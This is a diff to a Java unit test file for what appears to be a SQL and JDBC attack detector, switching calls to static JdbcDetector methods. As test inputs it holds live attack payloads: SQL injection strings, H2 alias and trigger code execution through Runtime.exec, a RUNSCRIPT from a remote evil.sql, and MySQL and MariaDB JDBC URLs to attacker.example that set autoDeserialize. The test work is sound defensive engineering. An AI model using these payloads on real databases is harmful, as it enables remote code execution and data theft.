@@ -25,14 +25,14 @@ final class DetectorEngineTest {
   @ParameterizedTest
   @ValueSource(strings = {"union/* report */select 2", "union -- report\nselect 2"})
   void recognizesRequestControlledUnion(String fragment) {
-    assertAlgorithm(engine.detectSql("select 1 " + fragment, request(Map.of("filter", List.of(fragment)))),
+    assertAlgorithm(JdbcDetector.detectSql("select 1 " + fragment, request(Map.of("filter", List.of(fragment)))),
         "sql_userinput");
   }
 
   @ParameterizedTest
   @ValueSource(strings = {"select sleep/* diagnostics */(3)", "select 2 where id = 2 or/* predicate */1=1"})
   void recognizesSqlStructureAcrossTokenSeparators(String query) {
-    assertAlgorithm(engine.detectSql(query, RequestContext.empty()), "sql_policy");
+    assertAlgorithm(JdbcDetector.detectSql(query, RequestContext.empty()), "sql_policy");
   }
 
   @ParameterizedTest
@@ -74,9 +74,9 @@ final class DetectorEngineTest {
   @Test
   void keepsSqlEvidenceAfterDialectSpecificQuoting() {
     // MySQL backslash quoting and adjacent unary minus are both legal in JDBC statements.
-    assertAlgorithm(engine.detectSql("select 'O\\'Brien' union select 2",
+    assertAlgorithm(JdbcDetector.detectSql("select 'O\\'Brien' union select 2",
         request(Map.of("filter", List.of("union select 2")))), "sql_userinput");
-    assertAlgorithm(engine.detectSql("select 4--2 union select 3",
+    assertAlgorithm(JdbcDetector.detectSql("select 4--2 union select 3",
         request(Map.of("filter", List.of("union select 3")))), "sql_userinput");
   }
 
@@ -100,7 +100,7 @@ final class DetectorEngineTest {
   @Test
   void detectsSqlUserInput() {
     var result =
-        engine.detectSql(
+        JdbcDetector.detectSql(
             "select * from users where name = '' OR '1'='1'",
             request(Map.of("value", List.of("' OR '1'='1"))));
 
@@ -110,7 +110,7 @@ final class DetectorEngineTest {
 
   @Test
   void detectsSqlPolicyFeatures() {
-    var result = engine.detectSql("select sleep(3)", request());
+    var result = JdbcDetector.detectSql("select sleep(3)", request());
 
     assertTrue(result.isPresent());
     assertEquals("sql_policy", result.orElseThrow().algorithm());
@@ -119,7 +119,7 @@ final class DetectorEngineTest {
   @Test
   void detectsSqlExceptionSignals() {
     var result =
-        engine.detectSqlException(
+        JdbcDetector.detectSqlException(
             "mysql",
             "1064",
             "",
@@ -133,7 +133,7 @@ final class DetectorEngineTest {
   @Test
   void detectsSqlRegex() {
     var result =
-        engine.detectSqlRegex(
+        JdbcDetector.detectSqlRegex(
             "select table_name from information_schema.tables", "information_schema", request());
 
     assertAlgorithm(result, "sql_regex");
@@ -148,21 +148,21 @@ final class DetectorEngineTest {
       "values 'LANGUAGE JAVA EXTERNAL NAME'"
   })
   void keepsSqlDocumentationSeparateFromExecutableClauses(String sql) {
-    assertTrue(engine.detectSql(sql, request()).isEmpty());
+    assertTrue(JdbcDetector.detectSql(sql, request()).isEmpty());
   }
 
   @Test
   void requiresTheSubmittedValueToSupplyAStatementBoundary() {
     String query = "select 'catalog'; select 2";
-    assertTrue(engine.detectSql(query, request(Map.of("term", List.of("catalog")))).isEmpty());
-    assertAlgorithm(engine.detectSql(query, request(Map.of("term", List.of("; select 2")))), "sql_userinput");
-    assertTrue(engine.detectSql("select '; select 2'", request(Map.of("term", List.of("; select 2")))).isEmpty());
+    assertTrue(JdbcDetector.detectSql(query, request(Map.of("term", List.of("catalog")))).isEmpty());
+    assertAlgorithm(JdbcDetector.detectSql(query, request(Map.of("term", List.of("; select 2")))), "sql_userinput");
+    assertTrue(JdbcDetector.detectSql("select '; select 2'", request(Map.of("term", List.of("; select 2")))).isEmpty());
   }
 
   @Test
   void detectsH2JavaAliasCodeExecution() {
     var result =
-        engine.detectSql(
+        JdbcDetector.detectSql(
             """
             CREATE ALIAS SHELL AS $$
             String shell(String cmd) throws java.io.IOException {
@@ -178,7 +178,7 @@ final class DetectorEngineTest {
 
   @Test
   void detectsH2RemoteRunScript() {
-    var result = engine.detectSql("RUNSCRIPT FROM 'http://example.com/evil.sql'", request());
+    var result = JdbcDetector.detectSql("RUNSCRIPT FROM 'http://example.com/evil.sql'", request());
 
     assertAlgorithm(result, "sql_h2_code_execution");
   }
@@ -186,12 +186,12 @@ final class DetectorEngineTest {
   @Test
   void detectsStandaloneStructuralSqlInjectionWithoutRequestContext() {
     var tautology =
-        engine.detectSql(
+        JdbcDetector.detectSql(
             "SELECT * FROM users WHERE username = 'admin' OR 1=1'", RequestContext.empty());
     var comment =
-        engine.detectSql("SELECT * FROM users WHERE username = 'admin'--'", RequestContext.empty());
+        JdbcDetector.detectSql("SELECT * FROM users WHERE username = 'admin'--'", RequestContext.empty());
     var unquotedOr =
-        engine.detectSql("SELECT * FROM users WHERE id = 1 OR 1=1", RequestContext.empty());
+        JdbcDetector.detectSql("SELECT * FROM users WHERE id = 1 OR 1=1", RequestContext.empty());
 
     assertAlgorithm(tautology, "sql_policy");
     assertAlgorithm(comment, "sql_policy");
@@ -201,7 +201,7 @@ final class DetectorEngineTest {
   @Test
   void ignoresBenignWhereOneEqualsOneBuilderPrefix() {
     var result =
-        engine.detectSql(
+        JdbcDetector.detectSql(
             "SELECT * FROM users WHERE 1=1 AND status = 'active'", RequestContext.empty());
 
     assertTrue(result.isEmpty());
@@ -277,7 +277,7 @@ final class DetectorEngineTest {
           PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
         """;
 
-    var result = engine.detectSql(query, request(Map.of("sql", List.of("SQLJ.INSTALL_JAR"))));
+    var result = JdbcDetector.detectSql(query, request(Map.of("sql", List.of("SQLJ.INSTALL_JAR"))));
 
     assertAlgorithm(result, "sql_derby_code_execution");
   }
@@ -294,7 +294,7 @@ final class DetectorEngineTest {
         """;
 
     var result =
-        engine.detectSql(
+        JdbcDetector.detectSql(
             query,
             new RequestContext(
                 "GET",
@@ -313,12 +313,12 @@ final class DetectorEngineTest {
         "CREATE FUNCTION APP.ADD_ONE(PARAM INT) RETURNS INT "
             + "PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'com.example.Math.addOne'";
 
-    assertTrue(engine.detectSql(query, RequestContext.empty()).isEmpty());
+    assertTrue(JdbcDetector.detectSql(query, RequestContext.empty()).isEmpty());
   }
 
   @Test
   void ignoresOrdinaryH2Alias() {
-    var result = engine.detectSql("CREATE ALIAS UUID FOR \"java.util.UUID.randomUUID\"", request());
+    var result = JdbcDetector.detectSql("CREATE ALIAS UUID FOR \"java.util.UUID.randomUUID\"", request());
 
     assertTrue(result.isEmpty());
   }
@@ -326,7 +326,7 @@ final class DetectorEngineTest {
   @Test
   void detectsH2JdbcInitCodeExecution() {
     var result =
-        engine.detectJdbcUrl(
+        JdbcDetector.detectJdbcUrl(
             "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript java.lang.Runtime.getRuntime().exec(\"id\") $$;AUTHZPWD=\\",
             request());
 
@@ -335,7 +335,7 @@ final class DetectorEngineTest {
 
   @Test
   void ignoresOrdinaryH2JdbcUrl() {
-    var result = engine.detectJdbcUrl("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1", request());
+    var result = JdbcDetector.detectJdbcUrl("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1", request());
 
     assertTrue(result.isEmpty());
   }
@@ -345,7 +345,7 @@ final class DetectorEngineTest {
     String url =
         "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
 
-    var result = engine.detectJdbcUrl(url, request(Map.of("url", List.of(url))));
+    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("url", List.of(url))));
 
     assertAlgorithm(result, "jdbc_mysql_deserialization");
   }
@@ -364,7 +364,7 @@ final class DetectorEngineTest {
         "jdbc:mysql://attacker.example:3308/?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false&maxAllowedPacket=16777216";
 
     var result =
-        engine.detectJdbcUrl(
+        JdbcDetector.detectJdbcUrl(
             url,
             new RequestContext(
                 "POST",
@@ -389,7 +389,7 @@ final class DetectorEngineTest {
     String url =
         "jdbc:mariadb://attacker.example:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
 
-    var result = engine.detectJdbcUrl(url, request(Map.of("jdbcUrl", List.of(url))));
+    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("jdbcUrl", List.of(url))));
 
     assertAlgorithm(result, "jdbc_mysql_deserialization");
   }
@@ -399,7 +399,7 @@ final class DetectorEngineTest {
     String url =
         "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";
 
-    var result = engine.detectJdbcUrl(url, request());
+    var result = JdbcDetector.detectJdbcUrl(url, request());
 
     assertTrue(result.isEmpty());
   }
@@ -408,7 +408,7 @@ final class DetectorEngineTest {
   void ignoresRequestControlledOrdinaryMysqlJdbcUrl() {
     String url = "jdbc:mysql://db.example:3306/app?useSSL=false&connectTimeout=1000";
 
-    var result = engine.detectJdbcUrl(url, request(Map.of("url", List.of(url))));
+    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("url", List.of(url))));
 
     assertTrue(result.isEmpty());
   }
@@ -2795,16 +2795,16 @@ final class DetectorEngineTest {
   void distinguishesRequestSuppliedCatalogReferenceFromFixedCatalogQuery() {
     var body = new RequestContext("POST", "/search", "", Map.of(), Map.of("content-type", "application/json"),
         "{\"source\":\"information_schema.tables\"}");
-    assertAlgorithm(engine.detectSql("select table_name from information_schema.tables", body), "sql_userinput");
-    assertTrue(engine.detectSql("select 'information_schema.tables' as term", body).isEmpty());
+    assertAlgorithm(JdbcDetector.detectSql("select table_name from information_schema.tables", body), "sql_userinput");
+    assertTrue(JdbcDetector.detectSql("select 'information_schema.tables' as term", body).isEmpty());
   }
 
   @Test
   void recognizesRequestSuppliedSqlCommentOutsideQuotedData() {
     var context = request(Map.of("item", List.of("42 --")));
-    assertAlgorithm(engine.detectSql("select id from orders where id = 42 -- and active", context),
+    assertAlgorithm(JdbcDetector.detectSql("select id from orders where id = 42 -- and active", context),
         "sql_userinput");
-    assertTrue(engine.detectSql("select id from orders where reference = '42 --'", context).isEmpty());
+    assertTrue(JdbcDetector.detectSql("select id from orders where reference = '42 --'", context).isEmpty());
   }
 
   @Test
